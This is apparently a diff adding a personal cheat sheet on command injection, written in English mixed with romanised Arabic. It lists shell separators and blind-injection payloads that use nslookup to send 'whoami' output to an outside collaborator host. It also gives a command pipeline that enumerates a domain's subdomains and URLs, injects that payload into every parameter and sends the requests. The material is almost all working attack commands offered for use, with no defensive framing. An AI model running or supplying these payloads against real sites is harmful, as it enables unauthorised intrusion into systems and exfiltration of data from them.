@@ -1,0 +1,27 @@
+whoami (use this for command injection for linux and windows)
+|,&,;,`,$(),||,&&
+# hashtag for comments
+| also use it before and after
+(use also the symbols for command injection)
+sleep 10(for windows and linux)
+jarreb l command injection in the name of the file when uploading file
+use collaborator for blind command injection
+in the parameter for email in feedback use `` to execute the whoami and after it use the collaborator  link to recieve the response
+like this:
+|nslookup+`whoami`.linkforcollaborator
+
+
+---------------------------------------
+techniques
+----------
+subfinder -d abc.com >> sub1
+cat sub1 | httpx >> alive
+cat alive| waybackurls |gf rce >> rce.txt
+cat rce.txt|grep "=" | qsreplace "| nslookup \`whoami\`.linkcollaborator" >> injection.txt (eza ma toli3 natije b8ayer l | la &)
+cat rce.txt|grep "=" | qsreplace "\` nslookup \`whoami\`.linkcollaborator\`" >> injection.txt
+cat injection.txt | httpx -fr
+split -l 10 injection.txt vuln.txt (split every 10 paramters in one file )
+cat vuln1.txt| grep "="|qsreplace "| nslookup \`whoami\`.colab" >> result.txt
+cat result.txt|httpx -fr
+bkafihun kollon la a3rif ayya 10 parameters toli3 mennon ersel
+
